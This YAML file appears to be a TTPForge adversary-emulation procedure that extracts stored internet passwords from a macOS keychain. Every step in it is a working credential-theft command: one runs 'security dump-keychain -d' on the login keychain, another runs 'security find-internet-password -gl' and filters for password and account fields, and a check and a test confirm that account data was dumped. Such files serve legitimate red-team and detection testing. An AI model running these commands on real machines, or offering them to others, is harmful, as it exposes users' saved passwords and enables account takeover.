api_version: 2.0
uuid: 12345678-1234-1234-1234-000000000002
name: Extract Internet Passwords
description: Extract internet passwords from macOS keychain
author: TTPForge
created: 2025-01-30
tactics:
  - Credential Access
techniques:
  - T1555.001
requirements:
  platforms:
    - os: darwin
args:
  - name: service_name
    description: Specific service to query (optional)
    default: ""
steps:
  - name: List Internet Passwords
    type: command
    command: "security dump-keychain -d login.keychain-db 2>/dev/null | grep -i 'srvce\\|acct' | head -30"
    
  - name: Extract Password for Service
    type: command
    command: "security find-internet-password -gl 2>&1 | grep -E 'password|account' | head -20"

checks:
  - type: stdout_contains
    value: "account"
    description: Verify output contains account information

tests:
  - name: Query Internet Passwords
    description: List internet passwords from keychain
    test_type: default
    steps:
      - "security dump-keychain -d login.keychain-db 2>/dev/null | head -5"

cleanup:
  - type: command
    command: "true"
    description: No cleanup required for read-only operation
